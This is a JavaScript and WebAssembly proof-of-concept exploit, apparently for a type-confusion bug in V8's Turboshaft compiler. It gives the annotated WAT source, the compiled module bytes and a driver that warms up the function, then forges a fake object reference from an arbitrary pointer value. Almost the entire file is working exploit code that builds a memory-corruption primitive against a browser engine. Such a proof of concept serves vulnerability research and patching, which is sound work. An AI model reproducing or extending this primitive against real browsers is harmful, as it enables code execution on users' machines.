/* WASM SOURCE:
    (module
        ;; A wrapper function which calls the given function while catching any traps
        (import "js" "pwn_catch_traps" (func $pwn_catch_traps (param i32) (param anyref) (param i32)))

        (type $struct_int (struct (field $field_int (mut i32))))
        (type $struct_ref (struct (field $field_ref (mut externref))))

        (func (export "confuse")
            (param $value i32)
            (result externref) ;; Value interpreted as a tagged pointer
        
            (local $target (ref $struct_ref))
            (local.set $target (struct.new_default $struct_ref))

            ;; Use our type confusion primitive to write an int into the target, which in actuality holds a reference
            (call $pwn_catch_traps (i32.const 0) (local.get $target) (local.get $value))

            (struct.get $struct_ref $field_ref (local.get $target))
        )

        (func (export "pwn")
            (param $warmup i32)
            (param $target anyref)
            (param $value i32)

            (local $val1 anyref)
            (local $val2 anyref)
            (local $val3 anyref)

            (local $trap1 anyref)
            (local $trap2 anyref)
            (local $trap3 anyref)

            ;; Bail if this is just a warmup
            (if (local.get $warmup) (then return))

            ;; Initialize all local variables of the phi chain with int-holding struct instances
            ;; This also sets the known type of all three variables to said struct
            (drop (local.tee $val1 (local.tee $val2 (local.tee $val3 (struct.new_default $struct_int)))))
            
            ;; Initialize a second phi-chain for bailing out of the loop once the bug has been triggered
            ;; We explicitly don't want to trigger the bug here (since otherwise our loop-exiting trap will be optimized away), so we inject the correct type feedback manually into the chain
            (drop (local.tee $trap1 (local.tee $trap2 (local.tee $trap3 (ref.i31 (i32.const 1234))))))
            
            (if (local.get $warmup) (then (local.set $trap2 (struct.new_default $struct_int))))

            (loop $l
                ;; Write the value to the target after it has propagated through the variable chain
                ;; Note that this cast's type check receives incorrect type feedback because of this bug, allowing the write to go through without trapping out
                (struct.set $struct_int $field_int (ref.cast (ref $struct_int) (local.get $val3)) (local.get $value))

                ;; We need to bloat the loop past a critical size to stop unrolling from stopping its transformation to a single-block loop
                ;; This also serves as our way to bail out of the loop after we trigger the bug; the type check performed here will bail once our non-conforming type fulled passed through the chain
                (drop (ref.cast i31ref (local.get $trap3)))
                (drop (ref.cast i31ref (local.get $trap3)))
                (drop (ref.cast i31ref (local.get $trap3)))
                <this is repeated 100x in the compiled assembly>

                ;; Shift over the values of each variable in the chain
                ;; Here we also insert the target at the start of the chain, which is not known to be of type $struct_int
                ;; As such the phis for all three variables should have no noteworthy type feedback attached to them
                ;; However, since the fixed point terminates prematurely, $val3's type feedback never gets updated, meaning the earlier type check gets incorrectly optimized away, leading to type confusion
                ;; (in theory, a chain of two variables should suffice to trigger this bug, however, in practice we need a third link in the chain to counteract loop peeling)
                (local.set $val3 (local.get $val2))
                (local.set $val2 (local.get $val1))
                (local.set $val1 (local.get $target))
            
                ;; - do the same for the loop-exiting trap chain
                (local.set $trap3 (local.get $trap2))
                (local.set $trap2 (local.get $trap1))
                (local.set $trap1 (struct.new_default $struct_int)) ;; - inject a non-i31ref type at the start of the chain, which causes our above cast to bail

                br $l ;; An infinite loop without any branches gets transformed into a single-block loop
            )
        )
    )
*/
let wasmMod = new WebAssembly.Module(new Uint8Array([0,97,115,109,1,0,0,0,1,20,4,95,1,127,1,95,1,111,1,96,3,127,110,127,0,96,1,127,1,111,2,22,1,2,106,115,15,112,119,110,95,99,97,116,99,104,95,116,114,97,112,115,0,2,3,3,2,3,2,7,17,2,7,99,111,110,102,117,115,101,0,1,3,112,119,110,0,2,10,200,5,2,24,1,1,100,1,251,1,1,33,1,65,0,32,1,32,0,16,0,32,1,251,2,1,0,11,172,5,1,6,110,32,0,4,64,15,11,251,1,0,34,5,34,4,34,3,26,65,210,9,251,28,34,8,34,7,34,6,26,32,0,4,64,251,1,0,33,7,11,3,64,32,5,251,22,0,32,2,251,5,0,0,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,8,251,23,108,26,32,4,33,5,32,3,33,4,32,1,33,3,32,7,33,8,32,6,33,7,251,1,0,33,6,12,0,11,0,11]));
let wasmInst = new WebAssembly.Instance(wasmMod, {
    "js": {
        "pwn_catch_traps": (...args) => {
            try {
                pwn(...args);
            } catch {
                console.log("Caught trap from pwn function");
            }
        }
    }
});
let { confuse, pwn } = wasmInst.exports;

//Warm up the pwn function
// - this is required since the bug is only present in Turboshaft, not Liftoff
console.log("Warmup...");
for(let i = 0; i < 100000; i++) pwn(1);
console.log(" - ok");

//Exploit our type confusion primitive to obtain a fake object reference
let fakeObj = confuse(0x12340 | 1);
console.log("Got fake object");
console.log(fakeObj); // - this will crash

